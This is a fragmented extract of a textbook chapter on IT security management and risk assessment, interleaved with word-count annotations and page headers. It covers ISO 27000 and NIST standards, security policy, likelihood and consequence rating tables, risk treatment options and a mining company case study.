decades. This has occurred in response to the rapid growth of, and dependence on, net-
worked computer systems and the associated rise in risks to these systems. In the last 
decade a number of national and international standards have been published. These 
represent a consensus on the best practice in the field. The International Standards 
Organization (ISO) has revised and consolidated a number of these standards into the
[Word Count: 81]

After studying this chapter, you should be able to:
[Word Count: 9]

◆	 Understand the process involved in IT security management.
◆	 Describe an organization’s IT security objectives, strategies, and policies.
◆	 Detail some alternative approaches to IT security risk assessment.
◆	 Detail steps required in a formal IT security risk assessment.
◆	 Characterize identified threats and consequences to determine risk.
◆	 Detail risk treatment alternatives.
[Word Count: 54]

ISO 27000 series. Table 14.1 details a number of recently adopted standards within this 
family. In the United States, NIST has also produced a number of relevant standards, 
including [NIST06], [NIST09], and [NIST12]. With the growth of concerns about 
corporate governance following events such as the Enron collapse and repeated inci-
dences of the loss of personal information by government organizations, auditors for 
such organizations increasingly require adherence to formal standards such as these.
[Word Count: 74]

[ISO13335] provides a conceptual framework for managing security. It defines 
IT security management as follows:
[Word Count: 15]

Table 14.1  ISO/IEC 27000 Series of Standards on IT Security Techniques
[Word Count: 11]

27000:2012
“Information security management systems—Overview and vocabulary” provides an 
­overview of information security management systems, and defines the vocabulary and 
­definitions used in the 27000 family of standards.
[Word Count: 28]

27001:2005
“Information security management systems—Requirements” specifies the requirements for 
establishing, implementing, operating, monitoring, reviewing, maintaining, and improving a 
documented Information Security Management System.
[Word Count: 23]

27002:2005
“Code of practice for information security management” provides guidelines for informa-
tion security management in an organization and contains a list of best-practice security 
controls. It was formerly known as ISO17799.
[Word Count: 32]

27003:2010
“Information security management system implementation guidance” details the process 
from inception to the production of implementation plans of an Information Security 
Management System specification and design.
[Word Count: 27]

27004:2009
“Information security management—Measurement” provides guidance to help organiza-
tions measure and report on the effectiveness of their Information Security Management 
System processes and controls.
[Word Count: 25]

27005:2011
“Information security risk management” provides guidelines on the information security 
risk management process. It supersedes ISO13335-3/4.
[Word Count: 17]

27006:2007
“Requirements for bodies providing audit and certification of information security 
­management systems” specifies requirements and provides guidance for these bodies.
[Word Count: 21]

IT Security Management: A process used to achieve and maintain appropri-
ate levels of confidentiality, integrity, availability, accountability, authenticity, and reli-
ability. IT security management functions include:
[Word Count: 27]

•	 determining organizational IT security objectives, strategies, and policies
•	 determining organizational IT security requirements
•	 identifying and analyzing security threats to IT assets within the organization
•	 identifying and analyzing risks
•	 specifying appropriate safeguards
•	 monitoring the implementation and operation of safeguards that are necessary in
[Word Count: 48]

order to cost effectively protect the information and services within the organization
•	 developing and implementing a security awareness program
•	 detecting and reacting to incidents
[Word Count: 26]

488    Chapter 14 / IT Security Management and Risk Assessment
[Word Count: 10]

Figure 14.1  Overview of IT Security Management
[Word Count: 7]

14.2 / Organizational Context and Security Policy   489
[Word Count: 8]

The iterative nature of this process is a key focus of [ISO27001], and is 
­specifically applied to the security risk management process in [ISO27005]. This 
standard details a model process for managing information security that comprises 
the ­following steps:1
[Word Count: 39]

Plan:	
Establish security policy, objectives, processes and proce-
dures; ­perform risk assessment; develop risk treatment plan 
with appropriate selection of controls or acceptance of risk.
Do:	
Implement the risk treatment plan.
Check:	 Monitor and maintain the risk treatment plan.
Act:	
Maintain and improve the information security risk man-
agement process in response to incidents, review, or iden-
tified changes.
[Word Count: 59]

This process is illustrated in Figure 14.2 (adapted from figure 1 in [ISO27001]), 
which can be aligned with Figure 14.1. The outcome of this process should be that 
the security needs of the interested parties are managed appropriately.
[Word Count: 38]

14.2	Organizational Context and Security Policy
[Word Count: 6]

The initial step in the IT security management process comprises an examination of 
the organization’s IT security objectives, strategies, and policies in the context of the 
organization’s general risk profile. This can only occur in the context of the wider 
organizational objectives and policies, as part of the management of the organiza-
tion. Organizational security objectives identify what IT security outcomes should 
be achieved. They need to address individual rights, legal requirements, and stan-
dards imposed on the organization, in support of the overall organizational objec-
tives. Organizational security strategies identify how these objectives can be met.
[Word Count: 97]

1Adapted from table 1 in [ISO27005] and the introduction to [ISO27001].
[Word Count: 11]

Figure 14.2  The Plan-Do-Check-Act Process Model
[Word Count: 6]

490    Chapter 14 / IT Security Management and Risk Assessment
[Word Count: 10]

Organizational security policies identify what needs to be done. These objectives, 
strategies, and policies need to be maintained and regularly updated based on the 
results of periodic security reviews to reflect the constantly changing technological 
and risk environments.
[Word Count: 38]

To help identify these organizational security objectives, the role and impor-
tance of the IT systems in the organization is examined. The value of these systems 
in assisting the organization achieve its goals is reviewed, not just the direct costs of 
these systems. Questions that help clarify these issues include the following:
[Word Count: 52]

• What key aspects of the organization require IT support in order to function
[Word Count: 14]

efficiently?
 
• What tasks can only be performed with IT support?
 
• Which essential decisions depend on the accuracy, currency, integrity, or
[Word Count: 22]

availability of data managed by the IT systems?
 
• What data created, managed, processed, and stored by the IT systems need
[Word Count: 21]

protection?
 
• What are the consequences to the organization of a security failure in their IT
[Word Count: 16]

If the answers to some of the above questions show that IT systems are important 
to the organization in achieving its goals, then clearly the risks to them should be 
assessed and appropriate action taken to address any deficiencies identified. A list 
of key organization security objectives should result from this examination.
[Word Count: 52]

Once the objectives are listed, some broad strategy statements can be developed. 
These outline in general terms how the identified objectives will be met in a ­consistent 
manner across the organization. The topics and details in the strategy ­statements 
depend on the identified objectives, the size of the organization, and the importance 
of the IT systems to the organization. The strategy statements should address the 
approaches the organization will use to manage the security of its IT systems.
[Word Count: 78]

Given the organizational security objectives and strategies, an organizational 
security policy is developed that describes what the objectives and strategies are and 
the process used to achieve them. The organizational or corporate security ­policy 
may be either a single large document or, more commonly, a set of related docu-
ments. This policy typically needs to address at least the following topics:2
[Word Count: 61]

• The scope and purpose of the policy
 
• The relationship of the security objectives to the organization’s legal and
[Word Count: 20]

­regulatory obligations, and its business objectives
[Word Count: 6]

• IT security requirements in terms of confidentiality, integrity, availability,
[Word Count: 10]

accountability, authenticity, and reliability, particularly with regard to the 
views of the asset owners
 
• The assignment of responsibilities relating to the management of IT security
[Word Count: 26]

and the organizational infrastructure
 
• The risk management approach adopted by the organization
[Word Count: 13]

2Adapted from the details provided in various sections of [ISO13335].
[Word Count: 10]

14.2 / Organizational Context and Security Policy   491
[Word Count: 8]

• How security awareness and training is to be handled
 
• General personnel issues, especially for those in positions of trust
 
• Any legal sanctions that may be imposed on staff, and the conditions under
[Word Count: 35]

which such penalties apply
 
• Integration of security into systems development and procurement
 
• Definition of the information classification scheme used across the organization
 
• Contingency and business continuity planning
 
• Incident detection and handling processes
 
• How and when this policy should be reviewed
 
• The method for controlling changes to this policy
[Word Count: 54]

The intent of the policy is to provide a clear overview of how an organization’s IT 
infrastructure supports its overall business objectives in general, and more spe-
cifically what security requirements must be provided in order to do this most 
effectively.
[Word Count: 41]

A real-world example of such an organizational security policy, for an 
EU-based engineering consulting firm, is provided in the premium content section 
of this book’s Web site (ComputerSecurityPolicy.pdf). For our purposes, we have 
changed the name of the company to Company wherever it appears in this docu-
ment. The company is an EU-based engineering consulting firm that specializes 
in the provision of planning, design, and management services for infrastructure 
development worldwide. As an illustration of the level of detail provided by this 
type of policy, Appendix H.1 reproduces Section 5 of the document, covering physical 
and environmental security.
[Word Count: 98]

Further guidance on requirements for a security policy is provided in online 
Appendix H.2, which includes the specifications from The Standard of Good 
Practice for Information Security from the Information Security Forum.
[Word Count: 32]

The term security policy can also refer to specific security rules for specific 
systems, or to specific control procedures and processes. In the context of trusted 
computing, as we discuss in Chapter 13, it refers to formal models for confidenti-
ality and integrity. In this chapter though, we use the term to refer to the descrip-
tion of the overall security objectives and strategies, as described at the start of 
this section.
[Word Count: 72]

492    Chapter 14 / IT Security Management and Risk Assessment
[Word Count: 10]

It is critical that an organization’s IT security policy has full approval and buy-in 
by senior management. Without this, experience shows that it is unlikely that sufficient 
resources or emphasis will be given to meeting the identified objectives and achieving 
a suitable security outcome. With the clear, visible support of senior management, it is 
much more likely that security will be taken seriously by all levels of personnel in the 
organization. This support is also evidence of concern and due diligence in the man-
agement of the organization’s systems and the monitoring of its risk profile.
[Word Count: 96]

Because the responsibility for IT security is shared across the organization, 
there is a risk of inconsistent implementation of security and a loss of central 
monitoring and control. The various standards strongly recommend that overall 
responsibility for the organization’s IT security be assigned to a single person, the 
organizational IT security officer. This person should ideally have a background in 
IT security. The responsibilities of this person include:
[Word Count: 68]

• Oversight of the IT security management process
 
• Liaison with senior management on IT security issues
 
• Maintenance of the organization’s IT security objectives, strategies, and policies
 
• Coordination of the response to any IT security incidents
 
• Management of the organization-wide IT security awareness and training
[Word Count: 48]

­programs
 
• Interaction with IT project security officers
[Word Count: 8]

Larger organizations will need separate IT project security officers associated with 
major projects and systems. Their role is to develop and maintain security policies 
for their systems, develop and implement security plans relating to these systems, 
handle the day-to-day monitoring of the implementation of these plans, and assist 
with the investigation of incidents involving their systems.
[Word Count: 56]

Another issue is the decision as to what constitutes an appropriate level of 
risk to accept. In an ideal world the goal would be to eliminate all risks completely.
[Word Count: 29]

Given the wide range of organizations, from very small businesses to ­global 
multinationals and national governments, there clearly needs to be a range of alter-
natives available in performing this process. There are a range of formal standards 
that detail suitable IT security risk assessment processes, including [ISO13335], 
[ISO27005], and [NIST12]. In particular, [ISO13335] recognizes four approaches to 
identifying and mitigating risks to an organization’s IT infrastructure:
[Word Count: 67]

• Baseline approach
 
• Informal approach
 
• Detailed risk analysis
 
• Combined approach
[Word Count: 13]

The choice among these will be determined by the resources available to the ­organization 
and from an initial high-level risk analysis that considers how valuable the IT systems 
are and how critical to the organization’s business objectives. Legal and regulatory 
­constraints may also require specific approaches. This information should be determined 
when developing the organization’s IT security objectives, strategies, and policies.
[Word Count: 61]

The goal of the baseline approach is to implement generally agreed controls to 
provide protection against the most common threats. These would include implement-
ing industry best practice in configuring and deploying systems, like those we discuss in 
Chapter 12 on operating systems security. As such, the baseline approach forms a good 
base from which further security measures can be determined. Suitable baseline recom-
mendations and checklists may be obtained from a range of organizations, including:
[Word Count: 76]

• Various national and international standards organizations
 
• Security-related organizations such as the CERT, NSA, and so on
 
• Industry sector councils or peak groups
[Word Count: 25]

494    Chapter 14 / IT Security Management and Risk Assessment
[Word Count: 10]

The use of the baseline approach alone would generally be recommended only for 
small organizations without the resources to implement more structured approaches. 
But it will at least ensure that a basic level of security is deployed, which is not 
­guaranteed by the default configurations of many systems.
[Word Count: 48]

The use of the informal approach would generally be recommended for small 
to medium-sized organizations where the IT systems are not necessarily essential to 
meeting the organization’s business objectives and where additional expenditure on 
risk analysis cannot be justified.
[Word Count: 39]

14.4 / Detailed Security Risk Analysis   495
[Word Count: 7]

of ­protection for some systems. The details of this approach are discussed in the 
next section.
[Word Count: 16]

The use of a formal, detailed risk analysis is often a legal requirement for 
some government organizations and businesses providing key services to them. This 
may also be the case for organizations providing key national infrastructure. For 
such organizations, there is no choice but to use this approach. It may also be the 
approach of choice for large organizations with IT systems critical to their business 
objectives and with the resources available to perform this type of analysis.
[Word Count: 78]

[ISO13335] considers that for most organizations, in most circumstances, this 
approach is the most cost effective. Consequently its use is highly recommended.
[Word Count: 22]

The formal, detailed security risk analysis approach provides the most accurate 
evaluation of an organization’s IT system’s security risks, but at the highest cost. 
This approach has evolved with the development of trusted computer systems,
[Word Count: 35]

496    Chapter 14 / IT Security Management and Risk Assessment
[Word Count: 10]

­initially focused on addressing defense security concerns, as we discuss in Chapter 13. 
The original security risk assessment methodology was given in the Yellow Book 
standard (CSC-STD-004-85 June 1985), one of the original U.S. TCSEC ­rainbow 
book series of standards. Its focus was entirely on protecting the confidentiality of 
information, reflecting the military concern with information classification. The 
­recommended rating it gave for a trusted computer system depended on difference 
between the minimum user clearance and the maximum information classification. 
Specifically it defined a risk index as
[Word Count: 87]

Risk Index = Max Info Sensitivity - Min User Clearance
[Word Count: 10]

A table in this standard, listing suitable categories of systems for each risk level, 
was used to select the system type. Clearly this limited approach neither adequately 
reflects the range of security services required nor the wide range of possible threats. 
Over the years since, the process of conducting a security risk assessment that does 
consider these issues has evolved.
[Word Count: 60]

A number of national and international standards document the expected 
formal risk analysis approach. These include [ISO27005], [NIST12], [ISO31000], 
[SASN06], and [SA04]. This approach is often mandated by government organiza-
tions and associated businesses. These standards all broadly agree on the process 
used. Figure 14.3 (reproduced from figure 5 in [NIST12]) illustrates a typical proc-
ess used.
[Word Count: 57]

14.4 / Detailed Security Risk Analysis   497
[Word Count: 7]

3Adapted from the Executive Summary of [NIST13].
[Word Count: 7]

Figure 14.4  Generic Organizational Risk Context
[Word Count: 6]

The initial step is known as establishing the context or system characterization. Its 
purpose is to determine the basic parameters within which the risk assessment will 
be conducted, and then to identify the assets to be examined.
[Word Count: 37]

At this point in determining an organization’s broad risk exposure, any rele-
vant legal and regulatory constraints must also be identified. These features provide 
a baseline for the organization’s risk exposure and an initial indication of the broad 
scale of resources it needs to expend to manage this risk in order to successfully 
conduct business.
[Word Count: 55]

498    Chapter 14 / IT Security Management and Risk Assessment
[Word Count: 10]

A decision also needs to be made as to precisely which risk assessment criteria 
will be used in this process. While there is broad general agreement on this ­process, 
the actual details and tables used vary considerably and are still evolving. This 
­decision may be determined by what has been used previously in this, or related, 
organizations. For government organizations, this decision may be specified by law 
or regulation. Lastly the knowledge and experience of those performing the analysis 
may determine the criteria used.
[Word Count: 84]

14.4 / Detailed Security Risk Analysis   499
[Word Count: 7]

Identification of Threats/Risks/Vulnerabilities
[Word Count: 3]

The next step in the process is to identify the threats or risks the assets are exposed 
to. This directly addresses the second of our three fundamental questions: “How 
are those assets threatened?” It is worth commenting on the terminology used here. 
The terms threat and risk, while having distinct meanings, are often used inter-
changeably in this context. There is considerable variation in the definitions of these 
terms, as seen in the range of definitions provided in the cited standards. The fol-
lowing definitions will be useful in our discussion:
[Word Count: 91]

Asset:	
A system resource or capability of value to its owner that requires protection.
Threat:	
A potential for a threat source to exploit a vulnerability in some asset, 
which if it occurs may compromise the security of the asset and cause 
harm to the asset’s owner.
Vulnerability:	 A flaw or weakness in an asset’s design, implementation, or operation
[Word Count: 58]

and management that could be exploited by some threat.
Risk:	
The potential for loss computed as the combination of the likelihood that 
a given threat exploits some vulnerability to an asset, and the magnitude 
of harmful consequence that results to the asset’s owner.
[Word Count: 43]

The relationship among these and other security concepts is illustrated in Figure 1.2, 
which shows that central term risk results from a threat exploiting vulnerabilities in 
assets that causes loss of value to the organization.
[Word Count: 35]

The goal of this stage is to identify potentially significant risks to the assets 
listed. This requires answering the following questions for each asset:
[Word Count: 24]

1.	 Who or what could cause it harm?
	
2.	 How could this occur?
[Word Count: 13]

Threat Identification  Answering the first of these questions involves 
identifying potential threats to assets. In the broadest sense, a threat is anything 
that might hinder or prevent an asset from providing appropriate levels of the key 
security services: confidentiality, integrity, availability, accountability, authenticity, 
and reliability. Note that one asset may have multiple threats, and a single threat 
may target multiple assets.
[Word Count: 61]

500    Chapter 14 / IT Security Management and Risk Assessment
[Word Count: 10]

• Motivation:  Why would they target this organization; how motivated are they?
[Word Count: 12]

• Capability:  What is their level of skill in exploiting the threat?
 
• Resources:  How much time, money, and other resources could they deploy?
 
• Probability of attack:  How likely and how often would your assets be targeted?
 
• Deterrence:  What are the consequences to the attacker of being identified?
[Word Count: 50]

Vulnerability Identification  Answering the second of these questions, “How 
could this occur?” involves identifying flaws or weaknesses in the organization’s
[Word Count: 20]

14.4 / Detailed Security Risk Analysis   501
[Word Count: 7]

IT systems or processes that could be exploited by a threat source. This will help 
determine the applicability of the threat to the organization and its significance. 
Note that the mere existence of some vulnerability does not mean harm will be 
caused to an asset. There must also be a threat source for some threat that can exploit 
the vulnerability for harm. It is the combination of a threat and a vulnerability that 
creates a risk to an asset.
[Word Count: 79]

Again, many of the standards listed previously include checklists of threats 
and vulnerabilities and suggestions for tools and techniques to list them and to 
determine their relevance to the organization. The outcome of this step should be 
a list of threats and vulnerabilities, with brief descriptions of how and why they 
might occur.
[Word Count: 53]

Risk = (Probability that threat occurs) * (Cost to organization)
[Word Count: 10]

Analyze Existing Controls  Before the likelihood of a threat can be specified, 
any existing controls used by the organization to attempt to minimize threats need 
to be identified. Security controls include management, operational, and technical 
processes and procedures that act to reduce the exposure of the organization to 
some risks by reducing the ability of a threat source to exploit some vulnerabilities. 
These can be identified by using checklists of existing controls, and by interviewing 
key organizational staff to solicit this information.
[Word Count: 82]

502    Chapter 14 / IT Security Management and Risk Assessment
[Word Count: 10]

Determine Likelihood  Having identified existing controls, the likelihood 
that each identified threat could occur and cause harm to some asset needs to 
be specified. The likelihood is typically described qualitatively, using values and 
descriptions such as those shown in Table 14.2.4 While the various risk assessment 
standards all suggest tables similar to these, there is considerable variation in their 
detail.5 The selection of the specific descriptions and tables used is determined at 
the beginning of the risk assessment process, when the context is established.
[Word Count: 84]

Likelihood 
Description
Expanded Definition
[Word Count: 4]

1
Rare
May occur only in exceptional circumstances and may be deemed as 
“unlucky” or very unlikely.
[Word Count: 17]

2
Unlikely
Could occur at some time but not expected given current  
controls, ­circumstances, and recent events.
[Word Count: 17]

3
Possible
Might occur at some time, but just as likely as not. It may be difficult 
to control its occurrence due to external influences.
[Word Count: 25]

4
Likely
Will probably occur in some circumstance and one should  
not be ­surprised if it occurred.
[Word Count: 17]

5
Almost Certain
Is expected to occur in most circumstances and certainly sooner  
or later.
[Word Count: 15]

4This table, along with Tables 16.3 and 16.4, is adapted from those given in [ISO27005], [ISO31000], 
[SASN06], and [SA04], but with descriptions expanded and generalized to apply to a wider range of 
organizations.
5The tables used in this chapter are chosen to illustrate a more detailed level of analysis than used in some 
other standards.
[Word Count: 55]

14.4 / Detailed Security Risk Analysis   503
[Word Count: 7]

1
Insignificant
Generally a result of a minor security breach in a single area. Impact 
is likely to last less than several days and requires only minor expendi-
ture to rectify. Usually does not result in any tangible detriment to the 
organization.
[Word Count: 42]

2
Minor
Result of a security breach in one or two areas. Impact is likely to last 
less than a week but can be dealt with at the segment or project level 
without management intervention. Can generally be rectified within 
project or team resources. Again, does not result in any tangible det-
riment to the organization, but may, in hindsight, show previous lost 
opportunities or lack of efficiency.
[Word Count: 68]

3
Moderate
Limited systemic (and possibly ongoing) security breaches. Impact 
is likely to last up to 2 weeks and will generally require manage-
ment intervention, though should still be able to be dealt with at the 
project or team level. Will require some ongoing compliance costs to 
overcome. Customers or the public may be indirectly aware or have 
limited information about this event.
[Word Count: 63]

504    Chapter 14 / IT Security Management and Risk Assessment
[Word Count: 10]

replicated elsewhere) to a major disaster (the server had the sole copy of all customer 
and financial records for a small business). As with the likelihood ratings, the conse-
quence ratings must be determined knowing the organization’s current practices and 
arrangements. In particular, the organization’s existing backup, disaster recovery, 
and contingency planning, or lack thereof, will influence the choice of rating.
[Word Count: 61]

Determine Resulting Level of Risk  Once the likelihood and consequence 
of each specific threat have been identified, a final level of risk can be assigned. 
This is typically determined using a table that maps these values to a risk level, 
such as those shown in Table 14.4. This table details the risk level assigned to each 
combination. Such a table provides the qualitative equivalent of performing the 
ideal risk calculation using quantitative values. It also indicates the interpretation 
of these assigned levels.
[Word Count: 82]

Documenting the Results in a Risk Register  The results of the risk analysis 
process should be documented in a risk register. This should include a summary 
table such that shown in Table 14.5. The risks are usually sorted in decreasing 
order of level. This would be supported by details of how the various items 
were determined, including the rationale, justification, and supporting evidence 
used. The aim of this documentation is to provide senior management with 
the information needed to make appropriate decisions as how to best manage  
the identified risks. It also provides evidence that a formal risk assessment process
[Word Count: 100]

4
Major
Ongoing systemic security breach. Impact will likely last 4–8 weeks 
and require significant management intervention and resources to 
overcome. Senior management will be required to sustain ongoing 
direct management for the duration of the incident and compliance 
costs are expected to be substantial. Customers or the public will be 
aware of the occurrence of such an event and will be in possession 
of a range of important facts. Loss of business or organizational out-
comes is possible, but not expected, especially if this is a once off.
[Word Count: 89]

5
Catastrophic
Major systemic security breach. Impact will last for 3 months or 
more and senior management will be required to intervene for the 
duration of the event to overcome shortcomings. Compliance costs 
are expected to be very substantial. A loss of customer business or 
other significant harm to the organization is expected. Substantial 
public or political debate about, and loss of confidence in, the orga-
nization is likely. Possible criminal or disciplinary action against 
personnel involved is likely.
[Word Count: 79]

6
Doomsday
Multiple instances of major systemic security breaches. Impact dura-
tion cannot be determined and senior management will be required 
to place the company under voluntary administration or other form 
of major restructuring. Criminal proceedings against senior man-
agement is expected, and substantial loss of business and failure to 
meet organizational objectives is unavoidable. Compliance costs are 
likely to result in annual losses for some years, with liquidation of 
the organization likely.
[Word Count: 73]

14.4 / Detailed Security Risk Analysis   505
[Word Count: 7]

Table 14.4  Risk Level Determination and Meaning
[Word Count: 7]

Likelihood
Doomsday
Catastrophic
Major
Moderate
Minor
Insignificant
[Word Count: 7]

Extreme (E)
Will require detailed research and management planning at an executive/director level. 
Ongoing planning and monitoring will be required with regular reviews. Substantial 
adjustment of controls to manage the risk is expected, with costs possibly exceeding 
original forecasts.
[Word Count: 39]

High (H)
Requires management attention, but management and planning can be left to senior 
project or team leaders. Ongoing planning and monitoring with regular reviews are 
likely, though adjustment of controls is likely to be met from within existing resources.
[Word Count: 40]

Medium (M)
Can be managed by existing specific monitoring and response procedures. Management 
by employees is suitable with appropriate monitoring and reviews.
[Word Count: 22]

Low (L)
Can be managed through routine procedures.
[Word Count: 8]

has been followed if needed, and a record of decisions made with the reasons for 
those decisions.
[Word Count: 17]

Once the details of potentially significant risks are determined, management needs 
to decide whether it needs to take action in response. This would take into account 
the risk profile of the organization and its willingness to accept a certain level of 
risk, as determined in the initial establishing the context phase of this process. Those 
items with risk levels below the acceptable level would usually be accepted with no 
further action required. Those items with risks above this will need to be considered 
for treatment.
[Word Count: 85]

Existing  
Controls
Likelihood
Consequence
[Word Count: 4]

506    Chapter 14 / IT Security Management and Risk Assessment
[Word Count: 10]

Figure 14.5 indicates a range of possibilities for costs versus levels of risk. 
If the cost of treatment is high, but the risk is low, then it is usually uneconomic 
to proceed with such treatment. Alternatively, where the risk is high and the cost 
comparatively low, treatment should occur. The most difficult area occurs between 
these extremes. This is where management must make a business decision about the 
most effective use of their available resources. This decision usually requires a more 
detailed investigation of the treatment options. There are five broad alternatives 
available to management for treating identified risks:
[Word Count: 99]

• Risk acceptance:  Choosing to accept a risk level greater than normal for busi-
[Word Count: 14]

ness reasons. This is typically due to excessive cost or time needed to treat the
[Word Count: 15]

Figure 14.5  Judgment about Risk Treatment
[Word Count: 6]

14.5 / Case Study: Silver Star Mines   507
[Word Count: 8]

risk. Management must then accept responsibility for the consequences to the 
organization should the risk eventuate.
 
• Risk avoidance:  Not proceeding with the activity or system that creates this
[Word Count: 29]

risk. This usually results in loss of convenience or ability to perform some 
function that is useful to the organization. The loss of this capability is traded 
off against the reduced risk profile.
 
• Risk transfer:  Sharing responsibility for the risk with a third party. This is
[Word Count: 47]

typically achieved by taking out insurance against the risk occurring, by enter-
ing into a contract with another organization, or by using partnership or joint 
venture structures to share the risks and costs should the threat eventuate.
 
• Reduce consequence:  By modifying the structure or use of the assets at risk
[Word Count: 51]

to reduce the impact on the organization should the risk occur. This could 
be achieved by implementing controls to enable the organization to quickly 
recover should the risk occur. Examples include implementing an off-site 
backup process, developing a disaster recovery plan, or arranging for data and 
processing to be replicated over multiple sites.
 
• Reduce likelihood:  By implementing suitable controls to lower the chance of
[Word Count: 65]

the vulnerability being exploited. These could include technical or administra-
tive controls such as deploying firewalls and access tokens, or procedures such 
as password complexity and change policies. Such controls aim to improve the 
security of the asset, making it harder for an attack to succeed by reducing the 
vulnerability of the asset.
[Word Count: 53]

A case study involving the operations of a fictional company Silver Star Mines ­illustrates 
this risk assessment process.6 Silver Star Mines is the local operations of a large global 
mining company. It has a large IT infrastructure used by numerous ­business areas. 
Its network includes a variety of servers, executing a range of ­application ­software 
typical of organizations of its size. It also uses applications that are far less common, 
some of which directly relate to the health and safety of those working in the mine. 
Many of these systems used to be isolated, with no network connections among them.
[Word Count: 100]

6This example has been adapted and expanded from a 2003 study by Peter Hoek. For our purposes, the 
name of the original company and any identifying details have been changed.
[Word Count: 30]

508    Chapter 14 / IT Security Management and Risk Assessment
[Word Count: 10]

In recent years, they have been connected together and connected to the ­company’s 
intranet to provide better management capabilities. However, this means they are 
now ­potentially accessible from the Internet, which has greatly increased the risks to 
these systems.
[Word Count: 39]

A security analyst was contracted to provide an initial review of the com-
pany’s risk profile and to recommend further action for improvement. Following 
initial discussion with company management, a decision was made to adopt a 
combined approach to security management. This requires the adoption of suit-
able baselines standards by the company’s IT support group for their systems. 
Meanwhile, the analyst was asked to conduct a preliminary formal assessment of 
the key IT systems to identify those most at risk, which management could then 
consider for treatment.
[Word Count: 88]

These managers also indicated that three key systems—the Financial, 
Procurement, and Maintenance/Production servers—were critical to the effective 
operation of core business areas. Any compromise in the availability or integrity
[Word Count: 29]

14.5 / Case Study: Silver Star Mines   509
[Word Count: 8]

of these systems would impact the company’s ability to operate effectively. Hence 
each of these were identified as a key asset.
[Word Count: 21]

This list of key assets is seen in the first column of Table 14.6, which is the risk 
register created at the conclusion of this risk assessment process.
[Word Count: 28]

Having determined the list of key assets, the analyst needed to identify signifi-
cant threats to these assets and to specify the likelihood and consequence values. 
The major concern with the SCADA asset is unauthorized compromise of nodes 
by an external source. These systems were originally designed for use on physi-
cally isolated and trusted networks and hence were not hardened against external 
attack to the degree that modern systems can be. Often these systems are running
[Word Count: 77]

Table 14.6  Silver Star Mines—Risk Register
[Word Count: 6]

Existing 
Controls
Likelihood
Consequence
[Word Count: 4]

Reliability and 
integrity of the 
SCADA nodes 
and network
[Word Count: 9]

Unauthorized 
modification of 
control system
[Word Count: 5]

Integrity of  
stored file and 
database  
information
[Word Count: 7]

Availability  
and integrity  
of financial  
system
[Word Count: 6]

Availability  
and integrity of 
procurement  
system
[Word Count: 6]

Availability  
and integrity of  
maintenance/ 
production  
system
[Word Count: 7]

Availability,  
integrity, and  
confidentiality  
of mail services
[Word Count: 7]

510    Chapter 14 / IT Security Management and Risk Assessment
[Word Count: 10]

14.5 / Case Study: Silver Star Mines   511
[Word Count: 8]

The information was summarized and presented to management. All of the 
resulting risk levels are above the acceptable minimum management specified as 
tolerable. Hence treatment is required. Even though the second asset listed had the
[Word Count: 35]

512    Chapter 14 / IT Security Management and Risk Assessment
[Word Count: 10]

[SLAY06] provides a discussion of issues involved with IT security management. 
[SCHN00] provides a very readable, general discussion of IT security issues and 
myths in the modern world. Current best practice in the field of IT security man-
agement is codified in a range of international and national standards, whose use 
is encouraged. These standards include [ISO27001], [ISO27002], [ISO27005], 
[ISO31000], [NIST95], [NIST09], [NIST12], [NIST13], [SASN06], and [SA04].
[Word Count: 67]

ISO13335	 ISO/IEC, “ISO/IEC 13335-1:2004—Information technology—Security
[Word Count: 5]

techniques—Management of information and communications technology 
security—Part 1: Concepts and models for information and communications 
technology security management,” 2004.
ISO27001	 ISO/IEC, “ISO/IEC 27001:2005—Information technology—Security
[Word Count: 24]

­techniques—Information security management systems—Requirements,” 2005.
ISO27002	 ISO/IEC, “ISO/IEC 27002:2005—Information technology—Security
[Word Count: 10]

­techniques—Code of practice for information security management,” 2005. 
Formerly known as ISO/IEC 17755:2005.
ISO27005	 ISO/IEC, “ISO/IEC 27005:2011—Information technology—Security
[Word Count: 18]

­techniques—Information security risk management,” 2011.
ISO31000	 ISO, “ISO 31000:2009—Risk management—Principles and guidelines,” 2009.
NIST95	
National Institute of Standards and Technology, An Introduction to 
Computer Security: The NIST Handbook, Special Publication 800-12, 
October 1995.
[Word Count: 33]

14.7 / Key Terms, Review Questions, and Problems   513
[Word Count: 9]

NIST09	
National Institute of Standards and Technology, Recommended Security 
Controls for Federal Information Systems, Special Publication 800-53 
Revision 3, August 2009.
NIST12	
National Institute of Standards and Technology, Risk Management Guide 
for Information Technology Systems, Special Publication 800-30 Revision 1, 
September 2012.
NIST13	
National Institute of Standards and Technology, Guide to Industrial Control 
Systems (ICS) Security, Special Publication 800-82 Revision 1, April 2013.
SA04		
Standards Australia, “HB 231:2004—Information Security Risk Management 
Guidelines,” 2004.
SASN06	 Standards Australia and Standards New Zealand, “HB 167:2006—Security
[Word Count: 82]

Risk Management,” 2006.
SCHN00	 Schneier, B. Secrets & Lies—Digital Security in a Networked World,
[Word Count: 14]

New York: John Wiley & Sons, 2000.
SLAY06	 Slay, J., and Koronios, A. Information Technology Security & Risk
[Word Count: 18]

Management. Milton, QLD: John Wiley & Sons Australia, 2006.
[Word Count: 9]

14.7	Key Terms, Review Questions, and Problems
[Word Count: 7]

asset
consequence
control
IT security management
level of risk
[Word Count: 9]

likelihood
organizational security policy
risk
risk appetite
risk assessment
[Word Count: 9]

risk register
threat
threat source
vulnerability
[Word Count: 6]

514    Chapter 14 / IT Security Management and Risk Assessment
[Word Count: 10]

14.11	
Indicate who provides the key information when determining each of the key assets, 
their likelihood of compromise, and the consequence should any be compromised.
	14.12	
State the two key questions answered to help identify threats and risks for an asset. 
Briefly indicate how these questions are answered.
	14.13	
Define consequence and likelihood.
	14.14	
What is the simple equation for determining risk? Why is this equation not commonly 
used in practice?
	14.15	
What are the items specified in the risk register for each asset/threat identified?
	14.16	
List and briefly define the five alternatives for treating identified risks.
[Word Count: 97]

15.1   	IT Security Management Implementation
[Word Count: 5]

15.4	  Implementation of Controls
Implementation of Security Plan
Security Awareness and Training
[Word Count: 12]

15.5	  Monitoring Risks
Maintenance
Security Compliance
Change and Configuration Management
Incident Handling
[Word Count: 12]

15.8	  Key Terms, Review Questions, and Problems
[Word Count: 7]

and Procedures 
IT Security Controls, Plans,
[Word Count: 6]

516    Chapter 15 / IT Security Controls, Plans, and Procedures
[Word Count: 10]

15.1	It Security Management Implementation
[Word Count: 5]

A risk assessment on an organization’s IT systems identifies areas needing 
treatment. The next step, as shown in Figure 14.1 on risk analysis options, is to 
select suitable controls to use in this treatment. An IT security control, safeguard, or 
countermeasure (the terms are used interchangeably) helps to reduce risks. We use 
the following definition:
[Word Count: 55]

After studying this chapter, you should be able to:
